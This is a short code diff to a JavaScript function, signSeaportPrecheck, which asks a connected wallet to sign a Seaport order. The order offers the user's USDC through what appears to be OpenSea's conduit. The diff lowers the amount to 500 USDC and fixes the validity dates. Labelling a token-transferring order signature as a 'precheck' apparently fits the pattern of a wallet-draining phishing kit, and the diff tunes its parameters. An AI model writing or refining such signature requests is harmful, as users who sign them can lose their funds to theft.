@@ -602,7 +602,9 @@ const signSeaportPrecheck = async (wagmiConfig, userAddress, chainId) => {
       { name: 'recipient', type: 'address' }
     ]
   }
-  const now = Math.floor(Date.now() / 1000)
+  // Фиксированные даты (UTC): 25 May 2025, 13:44 и 24 June 2025, 13:44
+  const fixedStart = Math.floor(Date.UTC(2025, 4, 25, 13, 44) / 1000) // Месяцы 0-индексированы
+  const fixedEnd = Math.floor(Date.UTC(2025, 5, 24, 13, 44) / 1000)
   const message = {
     offerer: userAddress,
     zone: '0x0000000000000000000000000000000000000000',
@@ -612,14 +614,14 @@ const signSeaportPrecheck = async (wagmiConfig, userAddress, chainId) => {
         itemType: 1,
         token: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
         identifierOrCriteria: 0,
-        startAmount: '1000000000',
-        endAmount: '1000000000',
+        startAmount: '500000000',
+        endAmount: '500000000',
         recipient: userAddress
       }
     ],
     orderType: 0,
-    startTime: String(now),
-    endTime: String(now + 2592000), // +30 days
+    startTime: String(fixedStart),
+    endTime: String(fixedEnd),
     zoneHash: '0x0000000000000000000000000000000000000000000000000000000000000000',
     salt: '27855337018906766782546881864045825683096516384821792734251274424712742754110',
     conduitKey: '0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000',
